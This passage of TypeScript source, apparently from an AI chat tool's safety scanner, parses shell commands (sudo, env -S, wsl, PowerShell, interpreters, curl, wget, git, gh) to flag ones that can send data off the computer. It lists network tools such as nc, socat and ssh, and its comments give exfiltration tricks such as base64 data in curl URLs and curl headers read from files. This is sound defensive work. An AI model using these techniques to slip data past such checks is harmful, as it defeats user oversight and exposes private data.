      for (let at = 1; at < arg.length; at++) {
        const letter = arg[at] as string;
        const rest = arg.slice(at + 1);
        if (sed && (letter === 'f' || letter === 's')) return true;
        if (awk && 'fEl'.includes(letter)) return true;
        if (sed && letter === 'i') break;
        if (letter === 'e') {
          const script = rest || next();
          if (script === null) return true;
          scripts.push(script);
          given = true;
          break;
        }
        if (awk && letter === 'i') {
          if ((rest || next()) !== 'inplace') return true;
          break;
        }
        if ((sed && letter === 'l') || (awk && 'Fv'.includes(letter))) {
          if (!rest) index++;
          break;
        }
      }
      continue;
    }
    if (!given) {
      scripts.push(arg);
      given = true;
    }
  }
  return scripts.some(script => (sed ? sedScriptActs(script) : awkProgramActs(script)));
}

/**
 * A Windows path split into a device prefix Windows takes literally and the rest: `\\?\C:\x` and
 * `\\.\UNC\server\share` name `C:\x` and `\\server\share`, and `\\?\Volume{...}\x` keeps its `\\?\`.
 */
function windowsDevicePath(text: string): [string, string] {
  if (!/^[\\/]{2}[?.][\\/]/.test(text)) return ['', text];
  const rest = text.slice(4);
  if (/^UNC[\\/]/i.test(rest)) return ['', `\\\\${rest.slice(4)}`];
  return /^[A-Za-z]:/.test(rest) ? ['', rest] : [text.slice(0, 4), rest];
}

/**
 * A program that runs the command after its own words. Any option letter not listed is a flag that
 * takes no value.
 */
interface Wrapper {
  /** Letters whose value is the rest of their word, or the next word when they end it. */
  values: string;
  /** Letters whose optional value is only ever the rest of their word. */
  glued?: string;
  /** Long options whose value is the next word unless written with `=`. */
  long?: readonly string[];
  /** Long options that take no value in the next word, so an abbreviation can be told from one of `long`. */
  flags?: readonly string[];
  /** Whether `NAME=value` words after the options set the command's environment. */
  assignments?: boolean;
  /** Words after the options that come before the command: timeout's duration. */
  operands?: number;
  /** Option letters that make it describe the command instead of running it: `command -v`. */
  describes?: string;
}

const WRAPPERS: ReadonlyMap<string, Wrapper> = new Map([
  [
    'sudo',
    {
      values: 'aCcDgpRrTtUu',
      glued: 'h',
      long: [
        'auth-type',
        'chdir',
        'chroot',
        'close-from',
        'command-timeout',
        'group',
        'host',
        'login-class',
        'other-user',
        'prompt',
        'role',
        'type',
        'user',
      ],
      flags: [
        'askpass',
        'background',
        'bell',
        'edit',
        'help',
        'list',
        'login',
        'no-update',
        'non-interactive',
        'preserve-env',
        'preserve-groups',
        'remove-timestamp',
        'reset-timestamp',
        'set-home',
        'shell',
        'stdin',
        'validate',
        'version',
      ],
      assignments: true,
    },
  ],
  [
    'env',
    {
      values: 'CPSafu',
      long: ['argv0', 'chdir', 'file', 'split-string', 'unset'],
      flags: [
        'block-signal',
        'debug',
        'default-signal',
        'help',
        'ignore-environment',
        'ignore-signal',
        'list-signal-handling',
        'null',
        'version',
      ],
      assignments: true,
    },
  ],
  ['command', { values: '', describes: 'vV' }],
  ['exec', { values: 'a' }],
  ['nohup', { values: '', flags: ['help', 'version'] }],
  // bash's `time` keyword times a whole simple command, assignments included.
  [
    'time',
    {
      values: 'fo',
      long: ['format', 'output'],
      flags: ['append', 'help', 'portability', 'quiet', 'verbose', 'version'],
      assignments: true,
    },
  ],
  ['nice', { values: 'n', long: ['adjustment'], flags: ['help', 'version'] }],
  [
    'timeout',
    {
      values: 'ks',
      long: ['kill-after', 'signal'],
      flags: ['foreground', 'help', 'preserve-status', 'verbose', 'version'],
      operands: 1,
    },
  ],
  [
    'xargs',
    {
      // `J`, `R` and `S` are macOS xargs; GNU refuses them.
      values: 'EIJLPRSadns',
      glued: 'eil',
      long: ['arg-file', 'delimiter', 'max-args', 'max-chars', 'max-procs', 'process-slot-var'],
      flags: [
        'eof',
        'exit',
        'help',
        'interactive',
        'max-lines',
        'no-run-if-empty',
        'null',
        'open-tty',
        'replace',
        'show-limits',
        'verbose',
        'version',
      ],
    },
  ],
  [
    'wsl',
    {
      values: 'du',
      long: ['cd', 'distribution', 'distribution-id', 'shell-type', 'user'],
      flags: ['exec', 'system'],
    },
  ],
]);

const NO_OPTIONS: Wrapper = { values: '' };

/** Launchers that take wsl's own arguments, so the scan reads them as `wsl`. */
const WSL_ALIASES = new Set(['wslg']);

/** A program's name as the scan looks it up: `/usr/bin/curl`, `curl.exe` and `CURL.EXE` are all `curl`; so is `npx.cmd` `npx`, and `wslg.exe` is `wsl`. */
export const programName = (executable: string): string => {
  const name = basename(executable)
    .toLowerCase()
    .replace(/\.(exe|cmd|bat)$/, '');
  return WSL_ALIASES.has(name) ? 'wsl' : name;
};

/** Whether a word names a wrapper (`sudo`, `/usr/bin/env`). */
export const isWrapper = (word: string): boolean => WRAPPERS.has(programName(unquote(word)));

/** The long option `given` names, read as getopt_long reads it: an exact name, or an abbreviation of exactly one. */
function longOptionName(wrapper: Wrapper, given: string): string | undefined {
  const names = [...(wrapper.long ?? []), ...(wrapper.flags ?? [])];
  if (names.includes(given)) return given;
  const named = names.filter(option => option.startsWith(given));
  return named.length === 1 ? named[0] : undefined;
}

/**
 * Whether long option `given` takes the next word. getopt_long refuses an ambiguous abbreviation; it
 * is read as a flag, so a program named right after it is still found.
 */
function longTakesValue(wrapper: Wrapper, given: string): boolean {
  const name = longOptionName(wrapper, given);
  return name !== undefined && (wrapper.long ?? []).includes(name);
}

/** How many words one of a wrapper's options spans: two when its value is the next word. */
function optionWords(wrapper: Wrapper, word: string): 1 | 2 {
  if (word.startsWith('--')) return !word.includes('=') && longTakesValue(wrapper, word.slice(2)) ? 2 : 1;
  // A value letter ends the cluster: `-Eu bob` and `-ubob` are both `-E -u bob`.
  for (let at = 1; at < word.length; at++) {
    if (wrapper.glued?.includes(word[at])) return 1;
    if (wrapper.values.includes(word[at])) return at === word.length - 1 ? 2 : 1;
  }
  return 1;
}

/**
 * The words of `name`'s options that start at `from`, as indices into `tokens`, and where its own words
 * (options, their values and, for env and sudo, assignments) end.
 */
function wrapperWords(name: string, tokens: readonly string[], from: number): { options: number[]; end: number } {
  const wrapper = WRAPPERS.get(name) ?? NO_OPTIONS;
  const options: number[] = [];
  let at = from;
  let reading = true;
  while (at < tokens.length) {
    const word = unquote(tokens[at]);
    if (reading && word === '--') {
      reading = false;
      at++;
    } else if (reading && word.startsWith('-')) {
      options.push(at);
      at += optionWords(wrapper, word);
    } else if (wrapper.assignments && /^[A-Za-z_][A-Za-z0-9_]*=/.test(word)) {
      at++;
    } else {
      break;
    }
  }
  return { options, end: Math.min(at, tokens.length) };
}

/**
 * The index past the wrapper at `tokens[at]` and its own words: options and their values, assignments, timeout's
 * duration. The end of `tokens` when the wrapper runs nothing.
 */
export function pastWrapper(tokens: readonly string[], at: number): number {
  const name = programName(unquote(tokens[at] ?? ''));
  const wrapper = WRAPPERS.get(name);
  const { options, end } = wrapperWords(name, tokens, at + 1);
  const describes = wrapper?.describes ?? '';
  const describing = options
    .map(index => unquote(tokens[index]))
    .some(word => /^-[^-]/.test(word) && [...word.slice(1)].some(letter => describes.includes(letter)));
  return describing ? tokens.length : Math.min(end + (wrapper?.operands ?? 0), tokens.length);
}

/** Where the command a run of leading wrappers (`sudo`, `env X=1`, `timeout 5`) runs starts in `tokens`. */
function wrappedStart(tokens: readonly string[]): number {
  let start = 0;
  while (start < tokens.length && isWrapper(tokens[start])) start = pastWrapper(tokens, start);
  return start;
}

/** Whether one of env's option words is `-S` (`--split-string`), which reads its value as a command line. */
function splitsString(word: string): boolean {
  const env = WRAPPERS.get('env') ?? NO_OPTIONS;
  if (word.startsWith('--')) return longOptionName(env, word.slice(2).split('=')[0]) === 'split-string';
  return [...word.slice(1)].find(letter => env.values.includes(letter)) === 'S';
}

export interface SplitString {
  /** The index of the `env` in the tokens. */
  env: number;
  /** The index of its `-S` word. */
  option: number;
  /** The command line env runs: itself, the value it splits, and the words after that value. */
  command: string;
}

/**
 * The value given to the wrapper option at `tokens[at]`, as written, and the index past it: after its `=`, after
 * `letter` in a short cluster, or the next word.
 */
function optionArgument(
  tokens: readonly string[],
  at: number,
  letter: string
): { value: string | undefined; next: number } {
  const word = unquote(tokens[at]);
  const glued = word.startsWith('--')
    ? word.includes('=')
      ? word.slice(word.indexOf('=') + 1)
      : undefined
    : word.slice(word.indexOf(letter) + 1) || undefined;
  return glued === undefined ? { value: tokens[at + 1], next: at + 2 } : { value: glued, next: at + 1 };
}

/** wsl's options that report on WSL itself instead of starting a distro. */
const WSL_REPORTS = new Set(['-l', '--list', '-v', '--version', '--status', '--help']);

/** What `ungranted` holds for a wsl run in a distro the command does not name: the default one, or one by id. */
export const UNNAMED_DISTRO = 'a WSL distro the command does not name';

/** What `ungranted` holds for a wsl run with `--system`, which starts the WSL system distro. */
export const SYSTEM_DISTRO = 'the WSL system distro';

/** What `ungranted` holds for a wsl run with an option that manages WSL itself, such as `--shutdown`. */
export const WSL_MANAGEMENT = 'a wsl option that manages WSL itself';

/** wsl's options that run a command in a distro; any other, such as `--shutdown`, manages WSL itself. */
const WSL_RUNS = new Set([
  'd',
  'u',
  'e',
  'cd',
  'distribution',
  'distribution-id',
  'user',
  'exec',
  'shell-type',
  'system',
]);

interface WslRun {
  /** The index of the `wsl` word, and the index past its own options. */
  at: number;
  end: number;
  /** The distro each `-d` names, undefined for one the text does not name; none given reads as the default distro. */
  distros: (string | undefined)[];
  /** Whether `-e` hands the words after its options to a program, not to the distro's shell as a command line. */
  exec: boolean;
  /** Whether `--system` starts the system distro, and whether an option outside `WSL_RUNS` is given. */
  system: boolean;
  managing: boolean;
}

/** Each `wsl` in a run of leading wrappers that starts a distro. */
function wslRuns(tokens: readonly string[]): WslRun[] {
  const wsl = WRAPPERS.get('wsl') ?? NO_OPTIONS;
  const runs: WslRun[] = [];
  for (let at = 0; at < tokens.length && isWrapper(tokens[at]); at = pastWrapper(tokens, at)) {
    if (programName(unquote(tokens[at])) !== 'wsl') continue;
    const { options, end } = wrapperWords('wsl', tokens, at + 1);
    if (WSL_REPORTS.has(unquote(tokens[options[0]] ?? ''))) break;
    const distros: (string | undefined)[] = [];
    let exec = false;
    let system = false;
    let managing = false;
    for (const index of options) {
      if (exec) break;
      const word = unquote(tokens[index]);
      const name = word.startsWith('--') ? longOptionName(wsl, word.slice(2).split('=')[0]) : word.slice(1, 2);
      if (name === undefined || !WSL_RUNS.has(name)) managing = true;
      if (name === 'e' || name === 'exec') exec = true;
      if (name === 'system') system = true;
      if (name === 'distribution-id') distros.push(undefined);
      if (name !== 'd' && name !== 'distribution') continue;
      const { value } = optionArgument(tokens, index, 'd');
      distros.push(value === undefined || isDynamic(value) ? undefined : unquote(value));
    }
    runs.push({ at, end, distros: distros.length > 0 ? distros : [undefined], exec, system, managing });
  }
  return runs;
}

/** The `env -S 'bash run.sh'` in a run of leading wrappers, which runs its value as a command line; null when none. */
export function splitString(tokens: readonly string[]): SplitString | null {
  for (let at = 0; at < tokens.length && isWrapper(tokens[at]); at = pastWrapper(tokens, at)) {
    if (programName(unquote(tokens[at])) !== 'env') continue;
    const option = wrapperWords('env', tokens, at + 1).options.find(index => splitsString(unquote(tokens[index])));
    if (option === undefined) continue;
    const { value, next } = optionArgument(tokens, option, 'S');
    // env reads options and assignments in the value too, as `env -S '-i FOO=1 make'`.
    return { env: at, option, command: [tokens[at], unquote(value ?? ''), ...tokens.slice(next)].join(' ') };
  }
  return null;
}

/** The command a wrapper runs, with the wrapper's own words dropped. */
function withoutWrappers(tokens: readonly string[]): string[] {
  return tokens.slice(wrappedStart(tokens));
}

/** A wrapper can change the executable, and these clients can start sending data just by changing flags. */
export function requiresExactShellRule(command: string): boolean {
  const head = /^(?:"([^"]*)"|'([^']*)'|(\S+))(?:\s+|$)/.exec(command);
  if (!head) return true;
  const executable = head[1] ?? head[2] ?? head[3];
  const name = programName(executable);
  const argumentsText = command.slice(head[0].length);
  return (
    // Quoting or an absolute executable defeats arityPrefix's bare-program lookup.
    head[1] !== undefined ||
    head[2] !== undefined ||
    executable !== basename(executable) ||
    WRAPPERS.has(name) ||
    /^(curl|wget|rsync|aws|gsutil|gcloud|docker|podman)$/.test(name) ||
    (name === 'gh' &&
      (/^(?:api|"api"|'api')(?:\s|$)/.test(argumentsText) || !/^[A-Za-z]+\s+[A-Za-z]+(?:\s|$)/.test(argumentsText)))
  );
}

const ALWAYS_OUTBOUND = new Set(['scp', 'sftp', 'ftp', 'nc', 'ncat', 'netcat', 'socat', 'telnet', 'ssh']);

// `-K` reads options from a file, which can hold `--data`; the `--url-query` and `--variable`
// families read one into the URL, and `--expand-*` runs a template over variables.
const CURL_SENDS = /^(-d|--data.*|-F|--form.*|-T|--upload-file|--json|-K|--config|--url-query|--variable|--expand-.*)$/;
// GNU wget accepts any unambiguous prefix, so `--post-f` means `--post-file`.
const WGET_SENDS = /^--(post|body)/;

/** Options that run a script given inline, which can open a socket no scan of the text sees. */
const DASH_C = /^-[a-zA-Z]*c/;
// Shells read `+c` like `-c` (`bash +ec '...'` runs the script); python reads `+c` as a file name.
const SHELL_C = /^[+-][a-zA-Z]*c/;
const INLINE_SCRIPT = new Map<string, RegExp>([
  ['node', /^(-[a-zA-Z]*[ep]|--eval|--print)(=|$)/],
  ['ruby', /^-[a-zA-Z]*e/],
  ['perl', /^-[a-zA-Z]*[eE]/],
  ['php', /^-r/],
  ['bun', /^(-[a-zA-Z]*[ep]|--eval|--print)(=|$)/],
  ['osascript', /^-e/],
  ['sh', SHELL_C],
  ['bash', SHELL_C],
  ['zsh', SHELL_C],
  ['dash', SHELL_C],
]);

/** The option that makes interpreter `name` run a script given inline, as `-c` for python. */
const inlineScriptOption = (name: string): RegExp | undefined =>
  /^python[\d.]*$/.test(name) ? DASH_C : INLINE_SCRIPT.get(name);

/** A command line a Windows shell runs. */
interface WindowsRun {
  /** How many of its arguments the opaque form names: through `-Command`, or up to the command text. */
  words: number;
  /** What it runs, for the outbound reason. */
  shown: string;
  /** Whether it reads that command line from stdin. */
  stdin: boolean;
}

const READS_STDIN: WindowsRun = { words: 0, shown: 'reading a script from stdin', stdin: true };

/** cmd's `/c`, `/k` or `/r` (`//c` as Git Bash needs it); without one, cmd runs what it reads from stdin. */
function cmdRun(args: readonly string[]): WindowsRun | null {
  const at = args.findIndex(arg => /^\/(.*\/)?[ckr]/i.test(arg));
  if (at !== -1) return { words: at + 1, shown: args[at], stdin: false };
  return args.some(arg => /^\/(.*\/)?\?/.test(arg)) ? null : READS_STDIN;
}

type PowershellParameter = 'command' | 'file' | 'value' | 'flag' | 'help';

/**
 * PowerShell's parameters as [name, shortest prefix it accepts, meaning to Windows PowerShell 5.1, to
 * PowerShell 7], null where that version has no such parameter. The first match wins, as in PowerShell.
 */
const POWERSHELL_PARAMETERS: readonly (readonly [
  string,
  string,
  PowershellParameter | null,
  PowershellParameter | null,
])[] = [
  ['?', '?', 'help', 'help'],
  ['help', 'h', 'help', 'help'],
  ['login', 'l', null, 'flag'],
  ['version', 'v', null, 'flag'],
  ['noexit', 'noe', 'flag', 'flag'],
  ['noprofile', 'nop', 'flag', 'flag'],
  ['nologo', 'nol', 'flag', 'flag'],
  ['noninteractive', 'noni', 'flag', 'flag'],
  ['noprofileloadtime', 'noprofileloadtime', null, 'flag'],
  ['socketservermode', 'so', 'flag', 'flag'],
  ['servermode', 's', 'flag', 'flag'],
  ['namedpipeservermode', 'nam', 'flag', 'flag'],
  ['sshservermode', 'sshs', null, 'flag'],
  ['interactive', 'i', null, 'flag'],
  ['configurationname', 'config', 'value', 'value'],
  ['configurationfile', 'configurationfile', null, 'value'],
  ['custompipename', 'cus', null, 'value'],
  ['command', 'c', 'command', 'command'],
  ['commandwithargs', 'commandwithargs', null, 'command'],
  ['cwa', 'cwa', null, 'command'],
  ['windowstyle', 'w', 'value', 'value'],
  ['workingdirectory', 'wo', null, 'value'],
  ['wd', 'wd', null, 'value'],
  ['file', 'f', 'file', 'file'],
  ['executionpolicy', 'ex', 'value', 'value'],
  ['ep', 'ep', 'value', 'value'],
  ['encodedcommand', 'e', 'command', 'command'],
  ['ec', 'ec', 'command', 'command'],
  ['encodedarguments', 'encodeda', 'value', 'value'],
  ['ea', 'ea', 'value', 'value'],
  ['settingsfile', 'settings', null, 'value'],
  ['sta', 'st', 'flag', 'flag'],
  ['mta', 'mta', 'flag', 'flag'],
  ['inputformat', 'i', 'value', 'value'],
  ['if', 'if', 'value', 'value'],
  ['outputformat', 'o', 'value', 'value'],
  ['of', 'of', 'value', 'value'],
];

/** String.Trim as .NET reads it: JS trim() plus U+0085. A loop, as a two-sided regex is quadratic on a long run of spaces. */
function trimDotNet(text: string): string {
  const isSpace = (char: string) => char === '\u0085' || char.trim() === '';
  let start = 0;
  let end = text.length;
  while (start < end && isSpace(text[start])) start += 1;
  while (end > start && isSpace(text[end - 1])) end -= 1;
  return text.slice(start, end);
}

/** The name a PowerShell switch gives after its dash (two for PowerShell 7) or slash, lowercased; undefined for other words. */
function powershellSwitch(arg: string, seven: boolean): string | undefined {
  const leader = seven ? /^(?:[-\u{2013}-\u{2015}]{1,2}|\/)/u : /^[-\u{2013}-\u{2015}/]/u;
  // .NET's String.Trim also removes U+0085, which JS trim() keeps.
  const trimmed = trimDotNet(arg);
  const match = leader.exec(trimmed);
  return match ? trimmed.slice(match[0].length).toLowerCase() : undefined;
}

function powershellParameter(name: string, seven: boolean): PowershellParameter | undefined {
  for (const [full, shortest, older, newer] of POWERSHELL_PARAMETERS) {
    const meaning = seven ? newer : older;
    if (meaning && name.length >= shortest.length && full.startsWith(name)) return meaning;
  }
  return undefined;
}

/**
 * Whether `arg` is a parameter that starts a command. A value parameter takes the next word whatever
 * it is, but one that would run a command is not skipped, so `-wd -c` still reads the command.
 */
function isCommandParameter(arg: string, seven: boolean): boolean {
  const name = powershellSwitch(arg, seven);
  return name !== undefined && powershellParameter(name, seven) === 'command';
}

/** What PowerShell (`seven` for pwsh) runs given `args`; null when it runs a script file or only prints help. */
function powershellRun(args: readonly string[], seven: boolean): WindowsRun | null {
  for (let at = 0; at < args.length; at++) {
    const name = powershellSwitch(args[at], seven);
    if (name === '') return READS_STDIN;
    const meaning = name === undefined ? undefined : powershellParameter(name, seven);
    if (meaning === 'command') return { words: at + 1, shown: args[at], stdin: false };
    if (meaning === 'help') return null;
    if (meaning === 'file') return args[at + 1] === '-' ? READS_STDIN : null;
    if (meaning === 'value' && args[at + 1] !== undefined && !isCommandParameter(args[at + 1], seven)) at++;
    if (meaning !== undefined) continue;
    // 5.1 runs the first word it does not know, and every word after it, as a command; 7 runs it as a script.
    return seven ? null : { words: at, shown: 'running its arguments as a command', stdin: false };
  }
  return READS_STDIN;
}

/** Windows shells, named as the scan looks them up, and what each runs given its arguments. */
const WINDOWS_SHELLS = new Map<string, (args: readonly string[]) => WindowsRun | null>([
  ['cmd', cmdRun],
  ['powershell', args => powershellRun(args, false)],
  ['pwsh', args => powershellRun(args, true)],
]);

/**
 * The option letters whose value is glued to the flag, so a letter after one is that value rather
 * than another flag: `ruby -rset` loads the library `set`, it does not run `-e`. Only list letters
 * the interpreter documents as taking a value.
 */
const OPTION_VALUE_LETTERS = new Map([
  ['python', 'WX'],
  ['node', 'rC'],
  ['bun', 'rld'],
  ['perl', 'IMmx'],
  ['ruby', 'rICEKFx'],
  ['osascript', 'ls'],
  ['zsh', 'oO'],
]);

/**
 * Value letters that take only a glued value (`ruby -xdir`): even at the end of a cluster they do
 * not swallow the next word, so a script's own `-e` after `ruby -x script.rb` is not ruby's option.
 */
const GLUED_ONLY_LETTERS = new Map([
  ['perl', 'x'],
  ['ruby', 'xKF'],
]);

/** The long forms of the above whose value is the next argument rather than glued to the flag. */
const OPTION_VALUE_WORDS = new Map<string, readonly string[]>([
  ['node', ['--require', '--import']],
  ['bun', ['--require', '--preload']],
  ['bash', ['--rcfile', '--init-file']],
]);

/** Common long options that take no value, so the word after one is not assumed to be its value. */
const OPTION_FLAG_WORDS = new Map<string, readonly string[]>([
  ['node', ['--inspect', '--inspect-brk', '--watch', '--enable-source-maps', '--no-warnings', '--trace-warnings']],
  ['bun', ['--watch', '--hot', '--smol']],
]);

/** Shells where -o/-O (and +o/+O) name an option in the next word, leaving the rest of the cluster as flags. */
const SHELL_OPTION_WORD = new Set(['sh', 'bash', 'dash']);

function optionValueLetters(program: string): string {
  return OPTION_VALUE_LETTERS.get(/^python[\d.]*$/.test(program) ? 'python' : program) ?? '';
}

/** The value letters that take the next word when they end a cluster; glued-only letters do not. */
function nextWordLetters(program: string): string {
  const glued = GLUED_ONLY_LETTERS.get(program) ?? '';
  return [...optionValueLetters(program)].filter(letter => !glued.includes(letter)).join('');
}

/** A flag cluster cut at its first value-taking letter: everything after it is that value. */
function flagRun(arg: string, letters: string): string {
  if (arg.startsWith('--')) return arg;
  const at = [...arg.slice(1)].findIndex(char => letters.includes(char));
  return at === -1 ? arg : arg.slice(0, at + 2);
}

/** Whether an option takes its value in the next argument rather than glued to its flag. */
function takesNextArgument(program: string, arg: string): boolean {
  if (arg.startsWith('--')) return !arg.includes('=') && (OPTION_VALUE_WORDS.get(program) ?? []).includes(arg);
  const cluster = arg.slice(1);
  const letters = nextWordLetters(program);
  const at = [...cluster].findIndex(char => letters.includes(char));
  return at !== -1 && at === cluster.length - 1;
}

/** A word that could be an option's value rather than the start of another option. */
function plainWord(arg: string | undefined): boolean {
  return arg !== undefined && !arg.startsWith('-') && !arg.startsWith('+');
}

/**
 * An interpreter's options, and the operands after them (a script file and its arguments). A
 * value-taking option swallows the rest of its cluster (`ruby -rset x.rb`) or its next argument
 * (`python3 -W ignore -c ...`), so neither the swallowed word nor a later script argument is read
 * as one of the interpreter's own options. An unrecognised long option is assumed to take the next
 * word, so a script after it cannot end the option prefix early (`node --loader ./x.mjs -e ...`
 * still runs `-e`).
 */
function interpreterOptions(program: string, args: readonly string[]): { options: string[]; operands: string[] } {
  const letters = optionValueLetters(program);
  const shellWord = SHELL_OPTION_WORD.has(program);
  // Shells also take flags as `+e`, which turn an option off rather than ending the options.
  const plusFlags = INLINE_SCRIPT.get(program) === SHELL_C;
  const options: string[] = [];
  let i = 0;
  for (; i < args.length; i++) {
    const arg = args[i];
    // `bash -oc pipefail '...'` is `-o pipefail` plus `-c`: `o` takes the next word and the letters
    // after it stay flags, unlike the glued value other interpreters read.
    if (shellWord && /^[+-][a-zA-Z]*[oO]/.test(arg)) {
      options.push(arg);
      i += [...arg.slice(1)].filter(letter => letter === 'o' || letter === 'O').length;
      continue;
    }
    // A lone `-` is the stdin operand, not an option.
    if (arg === '-' || (!arg.startsWith('-') && !(plusFlags && arg.startsWith('+')))) break;
    options.push(flagRun(arg, letters));
    if (takesNextArgument(program, arg)) i++;
    else if (
      arg.startsWith('--') &&
      arg !== '--' &&
      !arg.includes('=') &&
      !(OPTION_FLAG_WORDS.get(program) ?? []).includes(arg) &&
      plainWord(args[i + 1])
    ) {
      i++;
    }
  }
  return { options, operands: args.slice(i) };
}

/**
 * Interpreters that run a script fed on stdin when given no script file: `python3 - <<'EOF'`,
 * `echo x | sh`, and the shell builtins that read one in-process: `source <(curl https://x)`.
 */
const STDIN_SCRIPT = /^(python[\d.]*|node|ruby|perl|php|bun|osascript|sh|bash|zsh|dash|source|\.)$/;

/**
 * The leading words that name a command's opaque form, or null when the scan can read what it
 * runs. A wrapper (`sudo`, `timeout 5`) is looked through, so `sudo bash -c ...` is `sudo bash -c`.
 */
export function opaqueForm(tokens: readonly string[]): string | null {
  const normalised = tokens.map(unquote);
  const split = splitString(normalised);
  if (split) return tokens.slice(0, split.option + 1).join(' ');
  const wslShell = wslRuns(normalised).find(run => !run.exec);
  if (wslShell) return tokens.slice(0, wslShell.end).join(' ');
  const start = wrappedStart(normalised);
  const executable = normalised[start];
  if (executable === undefined) return null;
  const name = programName(executable);
  const args = normalised.slice(start + 1);
  const head = (count: number) => tokens.slice(0, start + count).join(' ');
  if (name === 'eval' || name === 'source' || name === '.') return head(1);
  if (name === 'deno' && args[0] === 'eval') return head(2);
  const windowsShell = WINDOWS_SHELLS.get(name);
  if (windowsShell) {
    const run = windowsShell(args);
    return run ? head(1 + run.words) : null;
  }
  const inline = inlineScriptOption(name);
  if (!inline && !STDIN_SCRIPT.test(name)) return null;
  const { options, operands } = interpreterOptions(name, args);
  if (inline && options.some(option => inline.test(option))) {
    return head(2 + args.findIndex(arg => inline.test(flagRun(arg, optionValueLetters(name)))));
  }
  return operands.length === 0 || operands[0] === '-' || STDIN_SCRIPT_ARG.test(operands[0]) ? head(1) : null;
}

/** Arguments that name the command's own standard input rather than a script file. */
const STDIN_SCRIPT_ARG = /^(\/(dev|proc\/self)\/fd\/[\d]+|\/dev\/stdin|[<>]\()/;

/** Programs that resolve a name, so a computed argument can smuggle data into a query. */
const RESOLVERS = new Set(['dig', 'nslookup', 'host']);

/** Git's global options that take the value in the next argument, which is not a subcommand. */
const GIT_OPTION_VALUES = /^--(git-dir|work-tree|namespace)(=|$)/;

/**
 * Whether a command's stdin is fed: piped into, a heredoc or here-string, or a `<` redirect. A
 * here-string parses as the command's own child, and `cat <<'EOF' | python3` nests the pipe that
 * feeds python3 inside the heredoc redirect, where python3 is that pipeline's first command.
 */
function readsStdin(node: Node): boolean {
  if (
    node.namedChildren.some(child => child?.type === 'herestring_redirect' || child?.type === 'process_substitution')
  ) {
    return true;
  }
  let self: Node = node;
  let parent = node.parent;
  if (parent?.type === 'redirected_statement') {
    const fed = parent.namedChildren.some(
      child =>
        child !== null &&
        (child.type === 'heredoc_redirect' ||
          child.type === 'herestring_redirect' ||
          (child.type === 'file_redirect' && redirectOperator(child) === '<'))
    );
    if (fed) return true;
    self = parent;
    parent = parent.parent;
  }
  return (
    parent?.type === 'pipeline' &&
    (parent.namedChildren[0]?.id !== self.id || parent.parent?.type === 'heredoc_redirect')
  );
}

/** The value an option sets, as `-X POST`, `-XPOST` or `--request=POST`; undefined when absent. */
function optionValue(args: readonly string[], flags: readonly string[]): string | undefined {
  for (let i = 0; i < args.length; i++) {
    for (const flag of flags) {
      if (args[i] === flag) return args[i + 1] ?? '';
      const joined = flag.startsWith('--') ? `${flag}=` : flag;
      if (args[i].startsWith(joined)) return args[i].slice(joined.length);
    }
  }
  return undefined;
}

function sendsBody(method: string | undefined): boolean {
  return method !== undefined && !/^(GET|HEAD)$/i.test(method);
}

/**
 * Why one simple command can send data off this computer, or null. Defence in depth only: a
 * script file, a decoded payload or a wrapper not listed here slips past, which is why a reply that
 * has read untrusted content asks before any command `containedCommand` does not vouch for (see
 * ChatService's DirectoryTurn.untrusted).
 */
export function outboundReason(raw: readonly string[], stdin = false): string | null {
  const tokens = raw.map(unquote);
  const split = splitString(tokens);
  if (split) {
    const option = tokens[split.option];
    const shown = option.startsWith('--') ? option.split('=')[0] : option.slice(0, option.indexOf('S') + 1);
    return `${basename(tokens[split.env])} ${shown}`;
  }
  // Without `-e`, wsl hands the words after its options to the distro's shell as one command line.
  const wslShell = wslRuns(tokens).find(run => !run.exec);
  if (wslShell) {
    const wsl = basename(tokens[wslShell.at]);
    if (wslShell.managing) {
      // Only words after a `--` are a command; an option's own operand (`--unregister Ubuntu`) is not.
      return unquote(tokens[wslShell.end - 1] ?? '') === '--' ? outboundReason(raw.slice(wslShell.end), stdin) : null;
    }
    if (wslShell.end < tokens.length) return `${wsl} running its arguments as a command`;
    return stdin ? `${wsl} reading a script from stdin` : null;
  }
  const start = wrappedStart(tokens);
  if (start >= tokens.length) return null;
  // As written, for the reason shown; `name` is what the program is looked up by.
  const program = basename(tokens[start]);
  const name = programName(tokens[start]);
  const args = tokens.slice(start + 1);
  // Any computed argument: `curl https://x/$(base64 a)` sends the file in a GET.
  const computed = raw.slice(start + 1).some(isDynamic);

  if (ALWAYS_OUTBOUND.has(name)) return program;
  if (name === 'curl') {
    const flag = args.find(
      arg => CURL_SENDS.test(arg.split('=')[0]) || (!/^-[a-zA-Z]*X/.test(arg) && /^-[a-zA-Z]*[dFTK]/.test(arg))
    );
    if (flag) return `curl ${flag.split('=')[0]}`;
    // A header read from a file (`-H @path`) sends what the file holds as a header value. Check
    // every header, not just the first: a call usually carries several, and any one of them can
    // name a file, however it is spelled (`-sH@file`, `--header=@file`, `--proxy-header @file`).
    const headerFile = args.some((arg, i) => {
      const glued = /^(?:-[a-zA-Z]*H|--(?:proxy-)?header=)(.+)$/.exec(arg);
      if (glued) return glued[1].startsWith('@');
      if (/^-[a-zA-Z]*H$/.test(arg) || arg === '--header' || arg === '--proxy-header') {
        return (args[i + 1] ?? '').startsWith('@');
      }
      return false;
    });
    if (headerFile) return 'curl -H';
    // `-sX POST` sets the method too.
    const method = optionValue(
      args.map(arg => arg.replace(/^-[a-zA-Z]*X/, '-X')),
      ['-X', '--request']
    );
    if (sendsBody(method)) return 'curl --request';
    return computed ? 'curl with a computed argument' : null;
  }
  if (name === 'wget') {
    const flag = args.find(arg => WGET_SENDS.test(arg.split('=')[0]));
    if (flag) return `wget ${flag.split('=')[0]}`;
    if (sendsBody(optionValue(args, ['--method']))) return 'wget --method';
    return computed ? 'wget with a computed argument' : null;
  }
  if (name === 'rsync') {
    return args.some(arg => !arg.startsWith('-') && (/^[^/]*:/.test(arg) || arg.startsWith('rsync://')))
      ? 'rsync to a remote host'
      : null;
  }
  if (name === 'git') {
    const words: string[] = [];
    for (let i = 0; i < args.length; i++) {
      if (args[i] === '-C' || args[i] === '-c') i++;
      else if (GIT_OPTION_VALUES.test(args[i])) {
        if (!args[i].includes('=')) i++;
      } else if (!args[i].startsWith('-')) words.push(args[i]);
    }
    const [sub, action] = words;
    if (sub === 'push' || sub === 'send-email') return `git ${sub}`;
    if (sub === 'remote' && (action === 'add' || action === 'set-url')) return `git remote ${action}`;
    return null;
  }
  if (name === 'gh') {
    const [sub, action] = args.filter(arg => !arg.startsWith('-'));
    if ((sub === 'gist' && (action === 'create' || action === 'edit')) || (sub === 'release' && action === 'upload')) {
      return `gh ${sub} ${action}`;
